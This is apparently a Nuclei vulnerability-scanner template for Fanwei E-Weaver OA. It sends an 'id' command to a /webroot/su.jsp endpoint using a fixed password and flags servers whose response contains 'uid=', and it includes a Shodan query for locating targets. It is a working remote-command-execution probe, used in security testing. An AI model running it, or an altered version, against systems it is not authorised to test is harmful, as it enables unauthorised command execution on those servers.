id: fanwei_RCE
info:
  name: fangwei RCE
  author: momika233
  severity: medium
  description: |
    fangwei OA RCE
  reference:
    - https://github.com/momika233
  metadata:
    shodan-query: 
    shodan-query: app="泛微-E-Weaver"
  tags: cve,cve2022,fanweiOA,RCE

requests:
  - method: GET
    path:
      - "{{BaseURL}}/webroot/su.jsp?pwd=023&i=id"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "uid=.*"

      - type: status
        status:
          - 200